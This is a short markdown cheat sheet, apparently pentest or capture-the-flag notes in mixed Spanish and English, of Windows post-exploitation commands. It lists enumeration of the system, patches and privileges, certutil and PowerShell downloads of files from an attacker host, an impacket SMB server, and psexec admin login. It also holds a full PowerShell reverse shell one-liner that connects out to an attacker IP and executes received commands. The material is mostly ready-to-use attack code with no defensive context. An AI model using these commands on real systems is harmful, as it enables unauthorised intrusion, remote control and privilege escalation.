# Local enumeration
## Systeminfo (for known system exploits)
```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```
## Parches
```
wmic qfe get Caption,Description,HotFixID
```
## Unidades de almacenamiento
```
wmic logicaldisk get Caption,description,providername
```
## Net
```
netstat -ano
```
## User enumeration
### Actual user
```
whoami /priv
whoami /groups
```
### Another User
```
net user babis
```
# Getting a file 
### CMD
``` 
certutil.exe -urlcache -split -f "http://ip:8000/archivo" archivo
```
### Powershell
```
Invoke-WebRequest -Uri http://ip:8000/archivo -OutFile archivo
```

### SMB
Local
```
python Tools/impacket/smbserver.py Tools .
```
Remote
```
copy \\10.10.14.27\Tools\file
```
# Exploit suggesters
### .exe
```
https://github.com/pentestmonkey/windows-privesc-check/blob/master/windows-privesc-check2.exe
```
### Python
```
https://github.com/pentestmonkey/windows-privesc-check/blob/master/windows_privesc_check.py
```

## Reverse Shell
### Powershell
```
$client = New-Object System.Net.Sockets.TCPClient("IP",PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

## Login as admin (sabiendo la pass)
```
psexec.py administrator@IP
```
